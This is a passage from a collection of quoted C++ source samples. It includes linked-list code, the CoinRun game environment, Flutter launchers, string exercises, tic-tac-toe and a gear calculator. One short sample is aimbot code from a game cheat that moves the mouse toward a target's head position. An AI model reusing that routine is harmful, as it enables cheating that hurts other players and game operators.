NULL)\r\n    {\r\n        cout<<\"Linked List is empty...\"<<endl;\r\n        return;\r\n    }\r\n    else if(First ->next == NULL)\r\n    {\r\n        delete First;\r\n        First = NULL;\r\n    }\r\n    else\r\n    {\r\n        temp = First;\r\n        First = First->next;\r\n        delete temp;\r\n    }\r\n\r\n    iCount--;\r\n}\r\n\r\ntemplate <class T>\r\nvoid SinglyLL <T> :: DeleteLast()\r\n{\r\n    struct nodeSL <T> * temp = NULL;\r\n\r\n    if(First == NULL)\r\n    {\r\n        cout<<\"Linked List is empty...\"<<endl;\r\n        return;\r\n    }\r\n    else if(First ->next == NULL)\r\n    {\r\n        delete First;\r\n        First = NULL;\r\n    }\r\n    else\r\n    {\r\n        temp = First;\r\n        \r\n        while(temp ->next->next != NULL)\r\n        {\r\n            temp = temp ->next;\r\n        }\r\n        delete temp->next;\r\n        temp->next = NULL;\r\n    }\r\n\r\n    iCount--;\r\n}\r\n\r\ntemplate <class T>\r\nvoid SinglyLL <T> :: DeleteAtPos(int iPos)\r\n{\r\n    struct nodeSL <T> * temp1 = NULL;\r\n    struct nodeSL <T> * temp2 = NULL;\r\n\r\n    int iLength = 0;\r\n    int i = 0;\r\n\r\n    iLength = Count();\r\n\r\n    if(iPos == 1)\r\n    {\r\n        DeleteFirst();\r\n    }\r\n    else if(iPos == iLength)\r\n    {\r\n        DeleteLast();\r\n    }\r\n    else\r\n    {\r\n        temp1 = First;\r\n\r\n        for(i = 1 ; i < iPos-1 ; i++)\r\n        {\r\n            temp1 = temp1 ->next;\r\n        }\r\n\r\n        temp2 = temp1 ->next;\r\n        temp1 ->next = temp2->next;\r\n        delete temp2;\r\n\r\n        iCount--;\r\n    }\r\n}\r\n\r\n////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n//\r\n//  DS Name      :      Singly Circular Linked List\r\n//  Description  :      Implimentation of All the methods of Data structures of Singly Circular LinkedList\r\n//  Author       :      Om Pramod Nikam\r\n//  Date         :      04/08/2024\r\n//\r\n//////////////////////////////////////////////////////////////////////////////////",
    "/*\nSource code for the CoinRun environment.\n\nThis is built as a shared library and loaded into python with ctypes.\nIt exposes a C interface similar to that of a VecEnv.\n\nAlso includes a mode that creates a window you can interact with using the keyboard.\n*/\n\n#include <QtCore/QMutexLocker>\n#include <QtCore/QWaitCondition>\n#include <QtWidgets/QApplication>\n#include <QtWidgets/QGridLayout>\n#include <QtWidgets/QCheckBox>\n#include <QtWidgets/QLabel>\n#include <QtWidgets/QDoubleSpinBox>\n#include <QtWidgets/QPushButton>\n#include <QtGui/QKeyEvent>\n#include <QtGui/QPainter>\n#include <QtWidgets/QToolButton>\n#include <QtCore/QDir>\n#include <QtCore/QThread>\n#include <QtCore/QProcess>\n#include <QtCore/QDateTime>\n#include <QtCore/QElapsedTimer>\n#include <QtCore/QDirIterator>\n#include <stdint.h>\n#include <time.h>\n#include <sys/time.h>\n#include <cmath>\n#include <random>\n#include <iostream>\n#include <memory>\n#include <assert.h>\n#include <set>\n\nconst int NUM_ACTIONS = 7;\nconst int MAZE_OFFSET = 1;\n\nstatic\nint DISCRETE_ACTIONS[NUM_ACTIONS * 2] = {\n    0, 0,\n    +1, 0,  // right\n    -1, 0,  // left\n    0, +1,  // jump\n    +1, +1, // right-jump\n    -1, +1, // left-jump\n    0, -1,  // down  (step down from a crate)\n};\n\nenum GameType {\n  CoinRunToTheRight_v0     = 1000,\n  CoinRunPlatforms_v0      = 1001,\n  CoinRunMaze_v0           = 1002,\n};\n\n#define VIDEORES 512         // try 64 to record 64x64 video from manual play\n#define VIDEORES_STR \"512\"\n\nconst char SPACE = '.';\nconst char LADDER = '=';\nconst char LAVA_SURFACE = '^';\nconst char LAVA_MIDDLE = '|';\nconst char WALL_SURFACE = 'S';\nconst char WALL_MIDDLE = 'A';\nconst char COIN_OBJ1 = '1';\nconst char COIN_OBJ2 = '2';\nconst char SPIKE_OBJ = 'P';\nconst char FLYING_MONSTER = 'F';\nconst char WALKING_MONSTER = 'M';\nconst char SAW_MONSTER = 'G';\n\nconst int DOWNSAMPLE = 16;\nconst float MAXSPEED = 0.5;\nconst float LADDER_MIXRATE = 0.4;\nconst float LADDER_V = 0.4;\nconst float MONSTER_SPEED = 0.15;\nconst float MONSTER_MIXRATE = 0.1;\n\nconst int RES_W = 64;\nconst int RES_H = 64;\n\nconst int MAX_COINRUN_DIFFICULTY = 3;\nconst int MAX_MAZE_DIFFICULTY = 4;\n\nbool USE_LEVEL_SET = false;\nint NUM_LEVELS = 0;\nint *LEVEL_SEEDS;\n\nbool RANDOM_TILE_COLORS = false;\nbool PAINT_VEL_INFO = false;\nbool USE_HIGH_DIF = false;\nbool USE_DATA_AUGMENTATION = false;\nint DEFAULT_GAME_TYPE = CoinRunToTheRight_v0;\n\nstatic bool shutdown_flag = false;\nstatic std::string monitor_dir;\nstatic int monitor_csv_policy;\n\nconst char* test =\n\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n\"A.....................F................A\"\n\"A.................F....................A\"\n\"A.............F........................A\"\n\"AAA..................................AAA\"\n\"AA....................................AA\"\n\"AAA..................................AAA\"\n\"AA....................................AA\"\n\"AAA..................................AAA\"\n\"A.......F..............................A\"\n\"A................F.....................A\"\n\"A.........................F............A\"\n\"A......................................A\"\n\"A......................................A\"\n\"A......................................A\"\n\"A......................................A\"\n\"A......................................A\"\n\"A...................G.......G..........A\"\n\"A.................aSSS^^^^^SSSb........A\"\n\"A....................AAAAAAA...........A\"\n\"A......................................A\"\n\"A...................................F..A\"\n\"A......................................A\"\n\"A........1.1.1M1.1.1.........=...1.....A\"\n\"A......aSSSSSSSSSSSSSb....aSb=..aSb....A\"\n\"A............................=.........A\"\n\"A............................=.........A\"\n\"A....  ......................=.........A\"\n\"A... .. .....=...2.2.2.2.2...=.........A\"\n\"A. ..... ....=aSSSSSSSSSSSSSSb.........A\"\n\"A............=.........................A\"\n\"A............=.........................A\"\n\"A..=.........=...............F.........A\"\n\"A..=...................................A\"\n\"A..=.......#&..........................A\"\n\"A..........$%..........................A\"\n\"A.....#$.#%$#...........S^^^^^^S.......A\"\n\"A.....%#.$&%#.....M..M..A||||||A.......A\"\n\"ASSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS^^A\"\n\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n;\n\nstatic std::vector<int> ground_theme_idxs;\nstatic std::vector<int> walking_theme_idxs;\nstatic std::vector<int> flying_theme_idxs;\n\nbool is_crat(char c) {\n  return c=='#' || c=='$' || c=='&' || c=='%';\n}\n\nbool is_wall(char c, bool crate_counts=false)\n{\n  bool wall = c=='S' || c=='A' || c=='a' || c=='b' || c=='a';\n  if (crate_counts)\n    wall |= is_crat(c);\n  return wall;\n}\nbool is_lethal(char c) {\n  return c == LAVA_SURFACE || c == LAVA_MIDDLE || c == SPIKE_OBJ;\n}\nbool is_coin(char c) {\n  return c==COIN_OBJ1 || c==COIN_OBJ2;\n}\n\nclass VectorOfStates;\n\nclass RandGen {\npublic:\n  bool is_seeded = false;\n  std::mt19937 stdgen;\n\n  int randint(int low, int high) {\n    assert(is_seeded);\n    uint32_t x = stdgen();\n    uint32_t range = high - low;\n    return low + (x % range);\n  }\n\n  float rand01() {\n    assert(i",
    "#include \"helper.hpp\"\r\n\r\nnamespace inp {\r\n\tclass mouse\r\n\t{\r\n\tpublic:\r\n\t\tinline void move(fvector2d Head2D) {\r\n\t\t\tfloat x = Head2D.x; float y = Head2D.y;\r\n\t\t\tfloat AimSpeed = globals::g_smooth;\r\n\r\n\t\t\tfvector2d ScreenCenter = { (double)screen_width / 2 , (double)screen_height / 2 };\r\n\t\t\tfvector2d Target;\r\n\r\n\t\t\tif (x != 0)\r\n\t\t\t{\r\n\t\t\t\tif (x > ScreenCenter.x)\r\n\t\t\t\t{\r\n\t\t\t\t\tTarget.x = -(ScreenCenter.x - x);\r\n\t\t\t\t\tTarget.x /= AimSpeed;\r\n\t\t\t\t\tif (Target.x + ScreenCenter.x > ScreenCenter.x * 2) Target.x = 0;\r\n\t\t\t\t}\r\n\r\n\t\t\t\tif (x < ScreenCenter.x)\r\n\t\t\t\t{\r\n\t\t\t\t\tTarget.x = x - ScreenCenter.x;\r\n\t\t\t\t\tTarget.x /= AimSpeed;\r\n\t\t\t\t\tif (Target.x + ScreenCenter.x < 0) Target.x = 0;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tif (y != 0)\r\n\t\t\t{\r\n\t\t\t\tif (y > ScreenCenter.y)\r\n\t\t\t\t{\r\n\t\t\t\t\tTarget.y = -(ScreenCenter.y - y);\r\n\t\t\t\t\tTarget.y /= AimSpeed;\r\n\t\t\t\t\tif (Target.y + ScreenCenter.y > ScreenCenter.y * 2) Target.y = 0;\r\n\t\t\t\t}\r\n\r\n\t\t\t\tif (y < ScreenCenter.y)\r\n\t\t\t\t{\r\n\t\t\t\t\tTarget.y = y - ScreenCenter.y;\r\n\t\t\t\t\tTarget.y /= AimSpeed;\r\n\t\t\t\t\tif (Target.y + ScreenCenter.y < 0) Target.y = 0;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tif ((int)Target.x != 0 or (int)Target.y != 0);\r\n\t\t\tDD_movR((int)Target.x, (int)Target.y);\r\n\t\t}\r\n\t};\r\n} static inp::mouse* input = new inp::mouse();",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"shoppingcart\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"chatgpt_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <iostream>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\n#include \"String.h\";\r\nusing namespace String;\r\n\r\n\r\n\r\n\r\nint main()\r\n{\r\n\r\n\r\n\t// Print First Letter Of Each Word\r\n\r\n\tPrintFirstLetterOfEachWord(ReadString());\r\n\r\n\t//Upeer First Letter Of Each Word\r\n\r\n\tstring S1 = ReadString();\r\n\r\n\tcout << \"\\n String after Conversion : \\n\";\r\n\tS1 = UpeerFirstLetterOfEachWord(S1);\r\n\tcout << S1 << endl;\r\n\r\n\t//Lower First Letter Of Each Word\r\n\r\n\tstring S2 = ReadString();\r\n\r\n\tcout << \"\\n String after Conversion : \\n\";\r\n\tS2 = LowerFirstLetterOfEachWord(S2);\r\n\tcout << S2 << endl;\r\n\r\n\t//Upper and Lower String\r\n\r\n\tstring S3 = ReadString();\r\n\r\n\tcout << \"\\n String after Upper : \\n\";\r\n\tS3 = UpperAllString(S3);\r\n\tcout << S3 << endl;\r\n\r\n\tcout << \"\\n String after Lower : \\n\";\r\n\tS3 = LowerAllString(S3);\r\n\tcout << S3 << endl;\r\n\r\n\t//Invert LetterCase\r\n\r\n\tchar Ch1 = ReadChar();\r\n\r\n\tcout << \"\\n Char after inverting case : \\n\";\r\n\tCh1 = InvertLetterCase(Ch1);\r\n\tcout << Ch1 << endl;\r\n\r\n\t//Invert All String LetterCase\r\n\r\n\tstring S4 = ReadString();\r\n\r\n\tcout << \"\\n String after Invert All String Letter Case : \\n\";\r\n\tS4 = InvertAllStringLetterCase(S4);\r\n\tcout << S4 << endl;\r\n\r\n\t//Count Capital Letters,Count Small Letters,Count Letters\r\n\r\n\tstring S5 = ReadString();\r\n\r\n\tcout << \"\\nString Length = \" << S5.length();\r\n\tcout << \"\\nCapital Letters Count = \" << CountCapitalLetters(S5);\r\n\tcout << \"\\nSmall Letters Count = \" << CountSmallLetters(S5);\r\n\r\n\tcout << \"\\n\\nMethod \\n\";\r\n\r\n\tcout << \"\\nString Length = \" << CountLetters(S5);\r\n\tcout << \"\\nCapital Letters Count = \" << CountLetters(S5, enWhatToCount::CapitalLetters);\r\n\tcout << \"\\nSmall Letters Count = \" << CountLetters(S5, enWhatToCount::SmallLetters);\r\n\r\n\r\n\t//Count Letter\r\n\r\n\tstring S6 = ReadString();\r\n\tchar Ch2 = ReadChar();\r\n\r\n\tcout << \"\\nLetter \\'\" << Ch2 << \"\\' count = \" << CountLetter(S6, Ch2) << endl;\r\n\r\n\t//Count Letter,Invert Letter Case\r\n\r\n\tstring S6 = ReadString();\r\n\tchar Ch3 = ReadChar();\r\n\r\n\tcout << \"\\nLetter \\'\" << Ch3 << \"\\' count = \" << CountLetter(S6, Ch3);\r\n\r\n\tcout << \"\\nLetter \\'\" << Ch3 << \"\\'\";\r\n\tcout << \"or \\'\" << InvertLetterCase(Ch3) << \"\\' \";\r\n\tcout << \" Count = \" << CountLetter(S6, Ch3, false);\r\n\r\n\t//Is Vowel?\r\n\r\n\tchar Ch4 = ReadChar();\r\n\r\n\tif (IsVowel(Ch4))\r\n\t\tcout << \"\\nYes Letter \\'\" << Ch4 << \"\\' is Vowel\";\r\n\telse\r\n\t\tcout << \"\\nNo Letter \\'\" << Ch4 << \"\\' is NOT Vowel\";\r\n\r\n\t//Count Vowels\r\n\r\n\tstring S7 = ReadString();\r\n\r\n\tcout << \"\\nNumber of vowels is: \" << CountVowels(S7);\r\n\r\n\t//Print Vowels \r\n\r\n\tstring S8 = ReadString();\r\n\r\n\tPrintVowels(S8);\r\n\r\n\t//Print Each WOrd In String\r\n\r\n\tPrintEachWordInString(ReadString());\r\n\r\n\t//Count Words\r\n\r\n\tstring S9 = ReadString();\r\n\tcout << \"\\nThe number of words in your string is: \";\r\n\tcout << CountWords(S9);\r\n\r\n\t//Split String\r\n\r\n\tvector <string> vString;\r\n\tvString = SplitString(ReadString(), \" \");\r\n\tcout << \"Tokens = \" << vString.size() << endl;\r\n\tfor (string& s : vString)\r\n\t{\r\n\t\tcout << s << endl;\r\n\t}\r\n\r\n\t//Trim Functions\r\n\r\n\tstring S10 = \"     Mohammed Abu-Hadhoud     \";\r\n\r\n\tcout << \"\\nString      = \" << S10;\r\n\tcout << \"\\n\\nTrim Left   = \" << TrimLeft(S10);\r\n\tcout << \"\\nTrim Right  = \" << TrimRight(S10);\r\n\tcout << \"\\nTrim        = \" << Trim(S10);\r\n\r\n\t//Join String\r\n\r\n\tvector<string> vString2 = { \"Mohammed\",\"Faid\",\"Ali\",\"Maher\" };\r\n\tcout << \"\\nVector after join: \\n\";\r\n\tcout << Join(vString2, \"###\");\r\n\r\n\t//Join String\r\n\r\n\tstring arrString[] = { \"Mohammed\",\"Faid\",\"Ali\",\"Maher\" };\r\n\tcout << \"\\n\\nArray after join: \\n\";\r\n\tcout << Join(arrString, 4, \"***\");\r\n\r\n\t// Problem Reverse Words In String\r\n\r\n\tstring S11 = ReadString();\r\n\tcout << \"\\n\\nString after reversing words:\";\r\n\tcout << \"\\n\" << ReverseWordsInString(S11);\r\n\r\n\t//Replace Word In String Using BuiltIn Function \r\n\r\n\tstring S12 = \"Welcome to Jordan , Jordan is a nice country\";\r\n\tstring StringToReplace = \"Jordan\";\r\n\tstring ReplaceTo = \"USA\";\r\n\r\n\tcout << \"\\nOrigial String\\n\" << S12;\r\n\tcout << \"\\n\\nString After Replace:\";\r\n\tcout << \"\\n\" << ReplaceWordInStringUsingBuiltInFunction(S12, StringToReplace, ReplaceTo);\r\n\r\n\t//Replace Word In String Using Split Function\r\n\r\n\tstring S13 = \"Welcome to Jordan , Jordan is a nice country\";\r\n\tstring StringToReplace = \"jordan\";\r\n\tstring ReplaceTo = \"USA\";\r\n\r\n\tcout << \"\\Original  String\\n\" << S13;\r\n\r\n\tcout << \"\\n\\nReplace with Match Case :\";\r\n\tcout << \"\\n\" << ReplaceWordInStringUsingSplit(S13, StringToReplace, ReplaceTo);\r\n\r\n\tcout << \"\\n\\nReplace with don't Match Case :\";\r\n\tcout << \"\\n\" << ReplaceWordInStringUsingSplit(S13, StringToReplace, ReplaceTo, false);\r\n\r\n\t//Remove Punctuation \r\n\r\n\tstring S14 = \"Welcome to Jordan , Jordan is a nice country ; it's amazing\"; \r\n\r\n\tcout << \"\\Original  String\\n\" << S14;\r\n\tcout << \"\\n\\nPunctuations Removed : \\n\" << RemovePunctuationsFromString(S14);\r\n\r\n\tsystem(\"pause > 0\");\r\n\treturn 0;\r\n}\r\n\r\n",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <numeric>\n\nusing namespace std;\n\nvoid distributeApples(vector<int> &appleWeights);\n\nint main()\n{\n    vector<int> appleWeights;\n    int weight;\n\n    cout << \"Enter apple weights in grams (enter -1 to stop): \" << endl;\n\n    // Read weights from the console until -1 is entered\n    while (true)\n    {\n        cin >> weight;\n        if (weight == -1)\n            break;                      // Stop when -1 is entered\n        appleWeights.push_back(weight); // Add weight to the list\n    }\n\n    distributeApples(appleWeights);\n\n    return 0;\n}\n\nvoid distributeApples(vector<int> &appleWeights)\n{\n    // Sort weights in descending order\n    sort(appleWeights.begin(), appleWeights.end(), greater<int>());\n\n    // Initialize lists for Ram, Sham, and Rahim\n    vector<int> ram, sham, rahim;\n\n    // Define the share of each person\n    int ramShare = 50;   // 50% of total weight\n    int shamShare = 30;  // 30% of total weight\n    int rahimShare = 20; // 20% of total weight\n\n    // Calculate total weight\n    int totalWeight = accumulate(appleWeights.begin(), appleWeights.end(), 0);\n\n    // Calculate individual weight limits based on total weight\n    int ramLimit = (ramShare * totalWeight) / 100;\n    int shamLimit = (shamShare * totalWeight) / 100;\n    int rahimLimit = (rahimShare * totalWeight) / 100;\n\n    // Initialize weight trackers\n    int ramWeight = 0;\n    int shamWeight = 0;\n    int rahimWeight = 0;\n\n    // Distribute apples according to share limits\n    for (int weight : appleWeights)\n    {\n        if (ramWeight < ramLimit)\n        {\n            ram.push_back(weight);\n            ramWeight += weight; // Add weight to Ram's total\n        }\n        else if (shamWeight < shamLimit)\n        {\n            sham.push_back(weight);\n            shamWeight += weight; // Add weight to Sham's total\n        }\n        else if (rahimWeight < rahimLimit)\n        {\n            rahim.push_back(weight);\n            rahimWeight += weight; // Add weight to Rahim's total\n        }\n        else\n        {\n            // If all limits are reached, break out of the loop\n            break;\n        }\n    }\n\n    // Output the distributed apples\n    cout << \"Ram: \";\n    for (int w : ram)\n        cout << w << \" \";\n    cout << \"| Total Weight: \" << ramWeight << \"g\" << endl;\n\n    cout << \"Sham: \";\n    for (int w : sham)\n        cout << w << \" \";\n    cout << \"| Total Weight: \" << shamWeight << \"g\" << endl;\n\n    cout << \"Rahim: \";\n    for (int w : rahim)\n        cout << w << \" \";\n    cout << \"| Total Weight: \" << rahimWeight << \"g\" << endl;\n}\n",
    "#include <iostream>\n#include<unistd.h>\nusing namespace std;\nvoid clearscreen() {\n  cout<<\"\\033[2J\\033[1;1H\";\n}\nint checkwin(char arr[], int &num) {\n  // for player 1\n  if (arr[0] == 'X' && arr[1] == 'X' && arr[2] == 'X') {\n    cout << \"Player 1 win\" << endl;\n    num=1;\n    return num;\n  } else if (arr[0] == 'X' && arr[4] == 'X' && arr[8] == 'X') {\n    cout << \"Player 1 win\" << endl;\n    num=1;\n    return num;\n  } else if (arr[0] == 'X' && arr[3] == 'X' && arr[6] == 'X') {\n    cout << \"Player 1 win\" << endl;\n    num=1;\n    return num;\n  } else if (arr[1] == 'X' && arr[4] == 'X' && arr[7] == 'X') {\n    cout << \"Player 1 win\" << endl;\n    num=1;\n    return num;\n  } else if (arr[2] == 'X' && arr[4] == 'X' && arr[6] == 'X') {\n    cout << \"Player 1 win\" << endl;\n    num=1;\n    return num;\n  } else if (arr[2] == 'X' && arr[5] == 'X' && arr[8] == 'X') {\n    cout << \"Player 1 win\" << endl;\n    num=1;\n    return num;\n  } else if (arr[3] == 'X' && arr[4] == 'X' && arr[5] == 'X') {\n    cout << \"Player 1 win\" << endl;\n    num=1;\n    return num;\n  } else if (arr[6] == 'X' && arr[7] == 'X' && arr[8] == 'X') {\n    cout << \"Player 1 win\" << endl;\n    num=1;\n    return num;\n  }\n  // For player 2\n  else if (arr[0] == '0' && arr[1] == '0' && arr[2] == '0') {\n    cout << \"Player 2 win\" << endl;\n      num=2;\n    return num;\n  } else if (arr[0] == '0' && arr[4] == '0' && arr[8] == '0') {\n    cout << \"Player 2 win\" << endl;\n    num=2;\n    return num;\n  } else if (arr[0] == '0' && arr[3] == '0' && arr[6] == '0') {\n    cout << \"Player 2 win\" << endl;\n    num=2;\n    return num;\n  } else if (arr[1] == '0' && arr[4] == '0' && arr[7] == '0') {\n    cout << \"Player 2 win\" << endl;\n    num=2;\n    return num;\n  } else if (arr[2] == '0' && arr[4] == '0' && arr[6] == '0') {\n    cout << \"Player 2 win\" << endl;\n    num=2;\n    return num;\n  } else if (arr[2] == '0' && arr[5] == '0' && arr[8] == '0') {\n    cout << \"Player 2 win\" << endl;\n    num=2;\n    return num;\n  } else if (arr[3] == '0' && arr[4] == '0' && arr[5] == '0') {\n    cout << \"Player 2 win\" << endl;\n    num=2;\n    return num;\n  } else if (arr[6] == '0' && arr[7] == '0' && arr[8] == '0') {\n    cout << \"Player 2 win\" << endl;\n    num=2;\n    return num;\n  }\n  //draw\n  else if((arr[0]=='X'||arr[0]=='0')&&(arr[1]=='X'||arr[1]=='0')&&(arr[2]=='X'||arr[2]=='0')&&(arr[3]=='X'||arr[3]=='0')&&(arr[4]=='X'||arr[4]=='0')&&(arr[5]=='X'||arr[5]=='0')&&(arr[6]=='X'||arr[6]=='0')&&(arr[7]=='X'||arr[7]=='0')&&(arr[8]=='X'||arr[8]=='0')){\n    cout<<\"Game draw\"<<endl;\n    num=3;\n    return num;\n  }\n  return 0;\n}\nvoid firstplayer(char arr[], int &pos) {\n  cout << \"player 1 = X       Player 2 = 0      10 = Exit the game\" << endl;\n  cout << \"\\t \\t|\\t \\t|\" << endl;\n  cout << \"\\t\" << arr[0] << \"\\t|\\t\" << arr[1] << \"\\t|\\t\" << arr[2] << endl;\n  cout << \"\\t__________________\" << endl;\n  cout << \"\\t \\t|\\t \\t|\" << endl;\n  cout << \"\\t\" << arr[3] << \"\\t|\\t\" << arr[4] << \"\\t|\\t\" << arr[5] << endl;\n   cout << \"\\t__________________\" << endl;\n  cout << \"\\t \\t|\\t \\t|\" << endl;\n  cout << \"\\t\" << arr[6] << \"\\t|\\t\" << arr[7] << \"\\t|\\t\" << arr[8] << endl;\n  cout << \"1st Player turn, Enter your position you want to insert X\" << endl;\n  cin >> pos;\n  if(pos>=10){\n    cout<<\"Player 1 exit\"<<endl;\n  }\n  arr[pos - 1] = 'X';\n  sleep(1);\n  clearscreen();\n}\nvoid secondplayer(char arr[], int &pos) {\n  cout << \"player 1 = X       Player 2 = 0      10 = Exit the game\" << endl;\n  cout << \"\\t \\t|\\t \\t|\" << endl;\n  cout << \"\\t\" << arr[0] << \"\\t|\\t\" << arr[1] << \"\\t|\\t\" << arr[2] << endl;\n  cout << \"\\t__________________\" << endl;\n  cout << \"\\t \\t|\\t \\t|\" << endl;\n  cout << \"\\t\" << arr[3] << \"\\t|\\t\" << arr[4] << \"\\t|\\t\" << arr[5] << endl;\n   cout << \"\\t__________________\" << endl;\n  cout << \"\\t \\t|\\t \\t|\" << endl;\n  cout << \"\\t\" << arr[6] << \"\\t|\\t\" << arr[7] << \"\\t|\\t\" << arr[8] << endl;\n  cout << \"2nd Player turn, Enter your position you want to insert 0\" << endl;\n  cin >> pos;\n  if(pos>=10){\n    cout<<\"Player 2 exit\"<<endl;\n  }\n  arr[pos - 1] = '0';\n  sleep(1);\n  clearscreen();\n}\n\nint main() {\n  char arr[] = {'1', '2', '3', '4', '5', '6', '7', '8', '9'};\n  int pos; //to store position that player want to insert\n  int num=0;//to check if game is draw or not\n  do {\n    firstplayer(arr, pos);\n    if (checkwin(arr, num) == 1 ) {\n      break;\n    }\n    if(checkwin(arr, num)==17){\n      break;\n    }\n    secondplayer(arr, pos);\n    if (checkwin(arr, num) == 2) {\n      break;\n    }\n    if(checkwin(arr, num)==3){\n      break;\n    }\n  } while (pos < 10);\n  return 0;\n  \n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"module7\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// helical gear.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <fstream>\n#include <string>\n#include <math.h>\n#include <cmath>\nusing namespace std;\n#define _USE_MATH_DEFINES\nvoid fullArr(string** dyn, string name, int stNum, int colm)\n{\n    ifstream reading(name);\n    if (reading.is_open()) {\n        for (int i = 0; i < (stNum + 1); i++) {\n            for (int c = 0; c < colm; c++) {\n                getline(reading, dyn[i][c], ',');\n                cout << dyn[i][c] << \"( \" << i << \",,,\" << c << \" )\";          // to print all data from the array\n                cout << \"\\t\\t\";\n            }\n            cout << endl;\n        }\n        cout << \"\\n\\n\\n\";\n        reading.close();\n    }\n    else\n    {\n        cout << \"unable to open file\" << endl;\n    }\n    // dyn[0][1] = to_string(stNum);\n}\n\n///////////////////////////////////////////////////////////////////////\nvoid delete2d(string** dyn, int n)\n{\n    int row = n;\n    for (int i = 0; i < row; i++)\n        delete[] dyn[i];\n    delete[] dyn;\n}\n///////////////////////////////////////////////////////////////////////\nstring** create2D(int n, int colm)\n{\n    int row = n + 2;\n    string** array2d = new string * [row];\n    for (int i = 0; i < row; i++)\n        array2d[i] = new string[colm];\n    return array2d;\n}\n\nint main()\n{\n    double alf = 20, alft,gama = 0, m = 0, mn = 0, b = 0, u = 0, Dp = 0, Dg = 0, Dpm = 0, Dgm = 0, Zp, Zg, Zfp, Zfg, DLTp = 0, DLTg = 0, L = 0, P = 0, Tp = 0, w = 0, V = 0, Pt = 0, Frp, Frg, Fap, Fag, Pd = 0, Pen = 0, Pw = 0, Kyp = 0, Kyg = 0, Ks = 0, Kv = 0,Kl, Sp, Sg, Syp, Sup, Syg, Sug, Senp, Seng, BHN=0, Kd, K = 0.111, e, ep, er, Ep, Eg, Kw, Kn, MS;\n    string** module, ** segma, ** epr, ** KW;\n    gama = 30 * (( 3.14159) / 180);\n    alf = 20 * ((3.14159) / 180);\n    module = create2D(50, 1);\n    segma = create2D(7, 3);\n    epr = create2D(17, 2);\n    KW = create2D(12, 4);\n    fullArr(module, \"modules .csv\", 50, 1);\n    fullArr(segma, \"segma .csv\", 7, 3);\n    fullArr(epr, \"permissible error.csv\", 17, 2);\n    fullArr(KW, \"load stress  factor (Kw) .csv\", 12, 4);\n 